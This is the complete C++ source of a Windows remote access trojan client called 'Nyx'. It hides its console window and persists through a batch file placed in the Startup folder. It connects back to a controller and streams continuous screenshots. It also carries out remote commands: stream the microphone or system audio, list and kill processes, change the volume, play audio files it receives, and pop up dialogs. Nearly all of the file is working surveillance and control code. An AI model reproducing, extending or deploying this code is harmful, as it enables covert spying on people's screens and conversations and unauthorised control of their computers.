#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <endpointvolume.h>
#include <propsys.h>
#include <tlhelp32.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <cstdio>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER_IP = "127.0.0.1";
const int PORT        = 4444;
const int PORT_AUDIO  = 4445;
const int PORT_DEVS   = 4446;
const int PORT_DIALOG = 4447;
const int PORT_PROCS  = 4448;

static const GUID s_SUBTYPE_FLOAT = {0x00000003,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const GUID s_SUBTYPE_PCM   = {0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const PROPERTYKEY s_PKEY_FriendlyName = {{0xa45c254e,0xdf1c,0x4efd,{0x80,0x20,0x67,0xd1,0x46,0xa8,0x50,0xe0}},14};

static std::atomic<bool> g_CaptureRunning{false};
static std::atomic<bool> g_StopCapture{false};
static struct { std::string message; std::string buttons[3]; int count; } g_DlgInfo;

void SetVolume(int vol){ CoInitialize(0); IMMDeviceEnumerator* pE=0;IMMDevice* pD=0;IAudioEndpointVolume* pV=0;
    if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE))&&SUCCEEDED(pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD))&&SUCCEEDED(pD->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pV))) pV->SetMasterVolumeLevelScalar(vol/100.0f,0);
    if(pV)pV->Release();if(pD)pD->Release();if(pE)pE->Release();CoUninitialize(); }

int GetEncoderClsid(const WCHAR* mime,CLSID* clsid){ UINT num=0,size=0;Gdiplus::GetImageEncodersSize(&num,&size);if(!size)return -1;
    Gdiplus::ImageCodecInfo* p=(Gdiplus::ImageCodecInfo*)malloc(size);Gdiplus::GetImageEncoders(num,size,p);
    for(UINT i=0;i<num;i++)if(wcscmp(p[i].MimeType,mime)==0){*clsid=p[i].Clsid;free(p);return i;}free(p);return -1; }

bool SendAll(SOCKET s,const char* d,int len){ int t=0;while(t<len){int n=send(s,d+t,len-t,0);if(n<=0)return false;t+=n;}return true; }
bool RecvAll(SOCKET s,char* d,int len){ int t=0;while(t<len){int n=recv(s,d+t,len-t,0);if(n<=0)return false;t+=n;}return true; }
bool IsFloatFmt(WAVEFORMATEX* pw){ if(pw->wFormatTag==WAVE_FORMAT_IEEE_FLOAT)return true;if(pw->wFormatTag==WAVE_FORMAT_EXTENSIBLE)return((WAVEFORMATEXTENSIBLE*)pw)->SubFormat==s_SUBTYPE_FLOAT;return false; }
bool IsPcmFmt(WAVEFORMATEX* pw){ if(pw->wFormatTag==WAVE_FORMAT_PCM)return true;if(pw->wFormatTag==WAVE_FORMAT_EXTENSIBLE)return((WAVEFORMATEXTENSIBLE*)pw)->SubFormat==s_SUBTYPE_PCM;return false; }

void SendDialogResponse(const std::string& text){ SOCKET sock=socket(AF_INET,SOCK_STREAM,0);sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT_DIALOG);inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0){int len=(int)text.size();send(sock,(char*)&len,4,0);send(sock,text.c_str(),len,0);}closesocket(sock); }

LRESULT CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp){
    switch(msg){
    case WM_CREATE:{ HFONT hFont=CreateFontW(16,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");SetWindowLongPtr(hwnd,GWLP_USERDATA,(LONG_PTR)hFont);
        int wlen=MultiByteToWideChar(CP_ACP,0,g_DlgInfo.message.c_str(),-1,NULL,0);wchar_t* wmsg=new wchar_t[wlen];MultiByteToWideChar(CP_ACP,0,g_DlgInfo.message.c_str(),-1,wmsg,wlen);
        HWND hMsg=CreateWindowExW(0,L"STATIC",wmsg,WS_CHILD|WS_VISIBLE|SS_CENTER|SS_CENTERIMAGE,20,25,360,60,hwnd,0,GetModuleHandle(0),0);SendMessage(hMsg,WM_SETFONT,(WPARAM)hFont,0);delete[]wmsg;
        int btnW=100,btnH=32,totalW=g_DlgInfo.count*btnW+(g_DlgInfo.count-1)*20,startX=(400-totalW)/2;
        for(int i=0;i<g_DlgInfo.count;i++){wlen=MultiByteToWideChar(CP_ACP,0,g_DlgInfo.buttons[i].c_str(),-1,NULL,0);wchar_t* wbtn=new wchar_t[wlen];MultiByteToWideChar(CP_ACP,0,g_DlgInfo.buttons[i].c_str(),-1,wbtn,wlen);
            HWND hB=CreateWindowExW(0,L"BUTTON",wbtn,WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,startX+i*(btnW+20),110,btnW,btnH,hwnd,(HMENU)(300+i),GetModuleHandle(0),0);SendMessage(hB,WM_SETFONT,(WPARAM)hFont,0);delete[]wbtn;} return 0;}
    case WM_COMMAND:{ int idx=LOWORD(wp)-300;if(idx>=0&&idx<g_DlgInfo.count){SendDialogResponse(g_DlgInfo.buttons[idx]);DestroyWindow(hwnd);}return 0;}
    case WM_CLOSE: SendDialogResponse("(closed)");DestroyWindow(hwnd);return 0;
    case WM_DESTROY:{HFONT hFont=(HFONT)GetWindowLongPtr(hwnd,GWLP_USERDATA);if(hFont)DeleteObject(hFont);PostQuitMessage(0);return 0;}
    }return DefWindowProc(hwnd,msg,wp,lp);
}

void ShowDialogThread(){ static bool registered=false;if(!registered){WNDCLASSEXA wc={sizeof(wc)};wc.lpfnWndProc=DialogProc;wc.hInstance=GetModuleHandle(0);wc.hCursor=LoadCursor(0,IDC_ARROW);wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);wc.lpszClassName="NyxDialog";RegisterClassExA(&wc);registered=true;}
    int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN);HWND dlg=CreateWindowExA(WS_EX_TOPMOST,"NyxDialog","Message",WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,(sw-400)/2,(sh-180)/2,400,180,NULL,NULL,GetModuleHandle(0),NULL);ShowWindow(dlg,SW_SHOW);UpdateWindow(dlg);MSG m;while(GetMessage(&m,0,0,0)){TranslateMessage(&m);DispatchMessage(&m);}}

void SendProcessList(){
    SOCKET sock=socket(AF_INET,SOCK_STREAM,0);sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT_PROCS);inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);
    if(connect(sock,(sockaddr*)&addr,sizeof(addr))!=0){closesocket(sock);return;}
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(snap==INVALID_HANDLE_VALUE){closesocket(sock);return;}
    PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);
    std::vector<std::pair<DWORD,std::string>> procs;
    if(Process32First(snap,&pe)){do{
        if(_stricmp(pe.szExeFile,"svchost.exe")==0) continue;
        procs.push_back({pe.th32ProcessID,std::string(pe.szExeFile)});
    }while(Process32Next(snap,&pe));}
    CloseHandle(snap);
    int count=(int)procs.size();SendAll(sock,(char*)&count,4);
    for(auto& p:procs){SendAll(sock,(char*)&p.first,4);int nl=(int)p.second.size();SendAll(sock,(char*)&nl,4);if(nl>0)SendAll(sock,p.second.c_str(),nl);}
    closesocket(sock);
}

void KillProcess(DWORD pid){
    HANDLE h=OpenProcess(PROCESS_TERMINATE,FALSE,pid);
    if(h){TerminateProcess(h,1);CloseHandle(h);}
}

void CaptureAndStream(bool systemAudio, int micDevIdx){
    g_CaptureRunning=true;SOCKET sock=INVALID_SOCKET;
    for(int attempt=0;attempt<15;attempt++){if(g_StopCapture)break;sock=socket(AF_INET,SOCK_STREAM,0);if(sock==INVALID_SOCKET)break;sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT_AUDIO);inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0)break;closesocket(sock);sock=INVALID_SOCKET;Sleep(400);}
    if(sock==INVALID_SOCKET){g_CaptureRunning=false;return;}
    CoInitialize(0);IMMDeviceEnumerator* pE=NULL;IMMDevice* pD=NULL;IAudioClient* pAC=NULL;IAudioCaptureClient* pCC=NULL;WAVEFORMATEX* pwfx=NULL;
    HRESULT hr=CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);
    if(SUCCEEDED(hr)){if(systemAudio){hr=pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD);}else{IMMDeviceCollection* pC=NULL;hr=pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);if(SUCCEEDED(hr)){UINT cnt;pC->GetCount(&cnt);hr=(micDevIdx>=0&&micDevIdx<(int)cnt)?pC->Item(micDevIdx,&pD):(cnt>0)?pC->Item(0,&pD):E_FAIL;pC->Release();}}}
    if(SUCCEEDED(hr)&&pD)hr=pD->Activate(__uuidof(IAudioClient),CLSCTX_ALL,0,(void**)&pAC);if(SUCCEEDED(hr))hr=pAC->GetMixFormat(&pwfx);
    DWORD flags=systemAudio?AUDCLNT_STREAMFLAGS_LOOPBACK:0;if(SUCCEEDED(hr))hr=pAC->Initialize(AUDCLNT_SHAREMODE_SHARED,flags,20000000,0,pwfx,NULL);if(SUCCEEDED(hr))hr=pAC->GetService(__uuidof(IAudioCaptureClient),(void**)&pCC);
    if(SUCCEEDED(hr)&&pwfx){int sr=pwfx->nSamplesPerSec;short ch=pwfx->nChannels;bool isF=IsFloatFmt(pwfx),isP=IsPcmFmt(pwfx);int bps=pwfx->wBitsPerSample;
        if(!SendAll(sock,(char*)&sr,4)||!SendAll(sock,(char*)&ch,2))goto cleanup;hr=pAC->Start();
        if(SUCCEEDED(hr)){bool connected=true;while(!g_StopCapture&&connected){while(!g_StopCapture){UINT32 pkt;hr=pCC->GetNextPacketSize(&pkt);if(FAILED(hr)||pkt==0)break;BYTE* pData;UINT32 nF;DWORD bf;hr=pCC->GetBuffer(&pData,&nF,&bf,NULL,NULL);if(FAILED(hr))break;int total=nF*ch,pcmLen=total*2;std::vector<short> pcm(total);
            if(bf&AUDCLNT_BUFFERFLAGS_SILENT){memset(pcm.data(),0,pcmLen);}else if(isF){float*f=(float*)pData;for(int i=0;i<total;i++){float v=f[i];if(v>1.f)v=1.f;if(v<-1.f)v=-1.f;pcm[i]=(short)(v*32767.f*0.85f);}}else if(isP&&bps==16){memcpy(pcm.data(),pData,pcmLen);for(int i=0;i<total;i++)pcm[i]=(short)(pcm[i]*0.85f);}else if(isP&&bps==32){int32_t*s32=(int32_t*)pData;for(int i=0;i<total;i++)pcm[i]=(short)((s32[i]>>16)*0.85f);}else if(isP&&bps==24){BYTE*p24=(BYTE*)pData;for(int i=0;i<total;i++){int32_t v=(int32_t)((uint32_t)p24[i*3]|((uint32_t)p24[i*3+1])<<8|((uint32_t)p24[i*3+2])<<16);if(v&0x800000)v|=0xFF000000;pcm[i]=(short)((v>>8)*0.85f);}}else if(isP&&bps==8){BYTE*p8=(BYTE*)pData;for(int i=0;i<total;i++)pcm[i]=(short)(((int)p8[i]-128)*256*0.85f);}else{float*f=(float*)pData;for(int i=0;i<total;i++){float v=f[i];if(v>1.f)v=1.f;if(v<-1.f)v=-1.f;pcm[i]=(short)(v*32767.f*0.85f);}}
            pCC->ReleaseBuffer(nF);int64_t sum=0;for(int i=0;i<total;i++)sum+=(int64_t)pcm[i]*pcm[i];if(sum/total<90000)memset(pcm.data(),0,pcmLen);
            if(!SendAll(sock,(char*)&pcmLen,4)||!SendAll(sock,(char*)pcm.data(),pcmLen))connected=false;}if(connected)Sleep(5);}pAC->Stop();}}
cleanup:if(pwfx)CoTaskMemFree(pwfx);if(pCC)pCC->Release();if(pAC)pAC->Release();if(pD)pD->Release();if(pE)pE->Release();CoUninitialize();closesocket(sock);g_CaptureRunning=false;
}

void SendDeviceList(){ SOCKET sock=socket(AF_INET,SOCK_STREAM,0);sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT_DEVS);inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);if(connect(sock,(sockaddr*)&addr,sizeof(addr))!=0){closesocket(sock);return;}
    CoInitialize(0);IMMDeviceEnumerator* pE=NULL;CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);IMMDeviceCollection* pC=NULL;pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);UINT cnt=0;pC->GetCount(&cnt);int n=(int)cnt;SendAll(sock,(char*)&n,4);
    for(int i=0;i<n;i++){IMMDevice* pD=NULL;pC->Item(i,&pD);IPropertyStore* pS=NULL;pD->OpenPropertyStore(STGM_READ,&pS);PROPVARIANT nm;ZeroMemory(&nm,sizeof(nm));pS->GetValue(s_PKEY_FriendlyName,&nm);char buf[256]={};if(nm.vt==VT_LPWSTR&&nm.pwszVal)WideCharToMultiByte(CP_ACP,0,nm.pwszVal,-1,buf,255,"?",NULL);int len=(int)strlen(buf);SendAll(sock,(char*)&len,4);SendAll(sock,buf,len);if(nm.vt==VT_LPWSTR&&nm.pwszVal)CoTaskMemFree(nm.pwszVal);pS->Release();pD->Release();}
    pC->Release();pE->Release();CoUninitialize();closesocket(sock); }

void CommandListener(SOCKET s){
    while(true){
        char cmd; if(recv(s,&cmd,1,0)!=1) break;
        if(cmd=='V'){ int vol; if(!RecvAll(s,(char*)&vol,4)) break; SetVolume(vol); }
        else if(cmd=='P'){ int sz; if(!RecvAll(s,(char*)&sz,4)) break; std::vector<char> buf(sz); if(!RecvAll(s,buf.data(),sz)) break; char tmp[MAX_PATH]; GetTempPathA(MAX_PATH,tmp); std::string f=std::string(tmp)+"nyx_remote.mp3"; mciSendStringA("close nyx",0,0,0); std::ofstream out(f,std::ios::binary); out.write(buf.data(),sz); out.close(); mciSendStringA(("open \""+f+"\" type mpegvideo alias nyx").c_str(),0,0,0); mciSendStringA("play nyx",0,0,0); }
        else if(cmd=='S'){ mciSendStringA("close nyx",0,0,0); }
        else if(cmd=='A'){ char on; if(recv(s,&on,1,0)!=1) break; if(on){g_StopCapture=true;while(g_CaptureRunning)Sleep(10);g_StopCapture=false;std::thread(CaptureAndStream,true,0).detach();}else{g_StopCapture=true;} }
        else if(cmd=='M'){ char on; if(recv(s,&on,1,0)!=1) break; int di=0; if(on&&!RecvAll(s,(char*)&di,4)) break; if(on){g_StopCapture=true;while(g_CaptureRunning)Sleep(10);g_StopCapture=false;std::thread(CaptureAndStream,false,di).detach();}else{g_StopCapture=true;} }
        else if(cmd=='L'){ std::thread([](){SendDeviceList();}).detach(); }
        else if(cmd=='R'){ std::thread([](){SendProcessList();}).detach(); }
        else if(cmd=='K'){ DWORD pid; if(!RecvAll(s,(char*)&pid,4)) break; KillProcess(pid); }
        else if(cmd=='D'){ int msgLen; if(!RecvAll(s,(char*)&msgLen,4)) break; std::string msg; if(msgLen>0){std::vector<char> mb(msgLen);if(!RecvAll(s,mb.data(),msgLen)) break;mb.push_back(0);msg=std::string(mb.data());} int numBtns; if(!RecvAll(s,(char*)&numBtns,4)) break; g_DlgInfo.message=msg; g_DlgInfo.count=0;
            for(int i=0;i<numBtns&&i<3;i++){int bLen;if(!RecvAll(s,(char*)&bLen,4))break;std::string btn;if(bLen>0){std::vector<char> bb(bLen);if(!RecvAll(s,bb.data(),bLen))break;bb.push_back(0);btn=std::string(bb.data());}g_DlgInfo.buttons[g_DlgInfo.count++]=btn;}
            std::thread([](){ShowDialogThread();}).detach(); }
    }
}

int main(){
    SetProcessDPIAware();
    { char me[MAX_PATH]; GetModuleFileNameA(0,me,MAX_PATH); std::string path=std::string(getenv("USERPROFILE"))+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat"; std::ofstream bat(path); bat<<"@echo off\nstart \"\" \""<<me<<"\"\n"; bat.close(); }
    WSADATA wsa; if(WSAStartup(MAKEWORD(2,2),&wsa)!=0) return 1;
    Gdiplus::GdiplusStartupInput gdip; ULONG_PTR gdipTok; Gdiplus::GdiplusStartup(&gdipTok,&gdip,0);
    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
    Gdiplus::EncoderParameters eps; eps.Count=1; eps.Parameter[0].Guid=Gdiplus::EncoderQuality; eps.Parameter[0].Type=Gdiplus::EncoderParameterValueTypeLong; eps.Parameter[0].NumberOfValues=1; ULONG quality=78; eps.Parameter[0].Value=&quality;
    while(true){
        SOCKET sock=socket(AF_INET,SOCK_STREAM,0); if(sock==INVALID_SOCKET){Sleep(5000);continue;}
        sockaddr_in addr{}; addr.sin_family=AF_INET; addr.sin_port=htons(PORT); inet_pton(AF_INET,SERVER_IP,&addr.sin_addr);
        if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0){
            std::thread(CommandListener,sock).detach();
            while(true){ HDC hdcScr=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hdcScr);HBITMAP bmp=CreateCompatibleBitmap(hdcScr,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hdcScr,0,0,SRCCOPY);IStream* strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);{Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jpegClsid,&eps);}SelectObject(mem,oldB);DeleteObject(bmp);DeleteDC(mem);ReleaseDC(NULL,hdcScr);STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE* data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);delete[] data;if(!ok) break;Sleep(150);}
        }
        closesocket(sock); Sleep(5000);
    }
    Gdiplus::GdiplusShutdown(gdipTok); WSACleanup(); return 0;
}